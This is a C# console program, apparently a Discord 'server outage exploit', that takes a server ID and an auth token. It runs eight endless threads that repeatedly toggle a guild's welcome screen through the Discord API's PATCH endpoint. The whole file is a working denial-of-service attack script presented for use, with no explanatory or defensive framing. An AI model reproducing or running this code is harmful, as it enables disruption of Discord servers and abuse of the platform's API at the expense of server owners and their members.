using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using Crayon;
using Leaf.xNet;
using System.Threading;

namespace Yaekith_ServerOutageExploitV3
{
    class Program
    {
        public static ulong sid;
        public static string tkn;
        static void Main(string[] args)
        {
            Console.WriteLine(Output.Red("Server ID: "));
            sid = ulong.Parse(Console.ReadLine());
            Console.WriteLine(Output.Red("Token: "));
            tkn = Console.ReadLine();
            Thread t1 = new Thread(YaekithIsGood);
            Thread t2 = new Thread(YaekithIsGood);
            Thread t3 = new Thread(YaekithIsGood);
            Thread t4 = new Thread(YaekithIsGood);
            Thread t5 = new Thread(YaekithIsGood);
            Thread t6 = new Thread(YaekithIsGood);
            Thread t7 = new Thread(YaekithIsGood);
            Thread t8 = new Thread(YaekithIsGood);
            t1.Start();
            t2.Start();
            t3.Start();
            t4.Start();
            t5.Start();
            t6.Start();
            t7.Start();
            t8.Start();
            t1.Join();
            t2.Join();
            t3.Join();
            t4.Join();
            t5.Join();
            t6.Join();
            t7.Join();
            t8.Join();



        }
        public static void YaekithIsGood()
        {
            while (true)
            {
                using (HttpRequest enable = new HttpRequest())
                {
                    enable.IgnoreProtocolErrors = true;
                    enable.AddHeader("Authorization", tkn);
                    enable.Patch($"https://discordapp.com/api/v8/guilds/{sid}/welcome-screen", "{*enabled*:true}".Replace('*', '"'), "application/json");
                    Console.WriteLine(Output.Red("State: ") + Output.Magenta("true"));
                }
                using (HttpRequest disable = new HttpRequest())
                {
                    disable.IgnoreProtocolErrors = true;
                    disable.AddHeader("Authorization", tkn);
                    disable.Patch($"https://discordapp.com/api/v8/guilds/{sid}/welcome-screen", "{*enabled*:false}".Replace('*', '"'), "application/json");
                    Console.WriteLine(Output.Red("State: ") + Output.Magenta("false"));
                }
            }
        }
    }
}
